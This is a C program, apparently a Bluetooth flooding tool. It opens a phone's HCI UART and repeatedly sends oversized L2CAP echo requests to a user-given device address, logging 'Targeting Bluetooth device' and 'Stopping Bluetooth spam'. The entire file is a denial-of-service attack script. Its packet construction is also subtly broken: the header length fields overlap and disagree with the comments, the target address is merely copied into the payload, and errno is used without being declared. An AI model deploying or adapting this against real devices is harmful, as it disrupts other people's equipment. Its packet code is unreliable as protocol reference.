#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <termios.h>
#include <signal.h>
#include <time.h>

#define BT_UART "/dev/ttyHSL0" // Bluetooth UART device
#define UNUSED(x) (void)(x)

int fd;
char target_addr[18]; // Store Bluetooth address

// Handle SIGINT (CTRL+C)
void signal_handler(int signo) {
    printf("Received signal %d\n", signo);
    UNUSED(signo);
    printf("\nStopping Bluetooth spam...\n");
    if (fd > 0) close(fd);
    exit(0);
}

// Open and configure UART
int open_uart() {
    int fd = open(BT_UART, O_RDWR | O_NOCTTY | O_SYNC);
    if (fd < 0) {
        perror("Failed to open Bluetooth UART device");
        exit(EXIT_FAILURE);
    }

    fcntl(fd, F_SETFL, O_NONBLOCK);  // Set the file descriptor to non-blocking mode

    struct termios tty;
    memset(&tty, 0, sizeof(tty));
    if (tcgetattr(fd, &tty) != 0) {
        perror("Error getting termios attributes");
        exit(EXIT_FAILURE);
    }

    cfsetospeed(&tty, B115200);
    cfsetispeed(&tty, B115200);

    tty.c_cflag = (CLOCAL | CREAD | CS8);
    tty.c_iflag = 0;
    tty.c_oflag = 0;
    tty.c_lflag = 0;

    tcflush(fd, TCIFLUSH);
    if (tcsetattr(fd, TCSANOW, &tty) != 0) {
        perror("Error setting termios attributes");
        exit(EXIT_FAILURE);
    }

    return fd;
}

// Validate Bluetooth address format
int is_valid_bt_addr(const char *addr) {
    int a, b, c, d, e, f;
    return sscanf(addr, "%2x:%2x:%2x:%2x:%2x:%2x", &a, &b, &c, &d, &e, &f) == 6;
}


void send_l2cap_echo_request(int fd) {
    srand(time(NULL));

    size_t random_size = (rand() % (600 - 590 + 1)) + 590;
    uint8_t hci_packet[random_size + 8];
    memset(hci_packet, 0, sizeof(hci_packet));

    // Extract the target Bluetooth address (6 bytes)
    uint8_t bt_addr[6];
    sscanf(target_addr, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
           &bt_addr[0], &bt_addr[1], &bt_addr[2], 
           &bt_addr[3], &bt_addr[4], &bt_addr[5]);

    // HCI ACL Data Header (4 bytes)
    hci_packet[0] = 0x02;  // HCI Packet Type: ACL Data
    hci_packet[1] = 0x0B;  // Handle (example: 0x000B)
    hci_packet[2] = 0x20;  // Flags: PB=10 (Start of L2CAP packet)
    hci_packet[3] = 0xFA;  // ACL Length = 606 bytes (0xFA 0x02)

    // L2CAP Header (4 bytes)
    hci_packet[4] = 0xF6;  // L2CAP Length = 600 bytes (0xF6 0x02)
    hci_packet[5] = 0x02;
    hci_packet[6] = 0x01;  // L2CAP CID = Signaling Channel (0x0001)
    hci_packet[7] = 0x00;

    // L2CAP Echo Request Header (4 bytes)
    hci_packet[8] = 0x08;  // Code: Echo Request
    hci_packet[9] = 0x01;  // Identifier
    hci_packet[10] = 0xF6; // Length = 600 bytes (0xF6 0x02)
    hci_packet[11] = 0x02;
    
    // Include the Bluetooth address (6 bytes) in the packet
    // Assuming you want to embed it in the packet's payload (adjust where needed)
    memcpy(&hci_packet[12], bt_addr, 6);  // Embed BT address in packet (adjust the offset)

    memset(&hci_packet[18], 'A', sizeof(hci_packet) - 18);  // Fill the rest of the packet

    ssize_t result = write(fd, hci_packet, sizeof(hci_packet));
    if (result < 0) {
        perror("Failed to send Echo Request");
        printf("Error code: %d\n", errno);
        close(fd);
        exit(EXIT_FAILURE);
    }    

    printf("Echo Request sent to %s!\n", target_addr);    
}


void receive_l2cap_echo_response(int fd) {
    uint8_t buffer[1024];

    int len = read(fd, buffer, sizeof(buffer));
    if (len > 0) {
        if (buffer[6] == 0x09) {  
            printf("Echo Response received from %s!\n", target_addr);
        } else {
            printf("Received unknown packet\n");
        }     
    }    
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <Bluetooth Address>\n", argv[0]);
        return EXIT_FAILURE;
    }

    strncpy(target_addr, argv[1], sizeof(target_addr) - 1);
    target_addr[sizeof(target_addr) - 1] = '\0';

    if (!is_valid_bt_addr(target_addr)) {
        fprintf(stderr, "Invalid Bluetooth address format.\n");
        return EXIT_FAILURE;
    }

    printf("Targeting Bluetooth device: %s\n", target_addr);
    
    signal(SIGINT, signal_handler);
    fd = open_uart();

    while (1) {
        srand(time(NULL));    
        int sleep_time = (rand() % (90 - 70 + 1)) + 70;

        send_l2cap_echo_request(fd);        
        receive_l2cap_echo_response(fd);
        usleep(sleep_time * 1000);
    }

    close(fd);
    return 0;
}
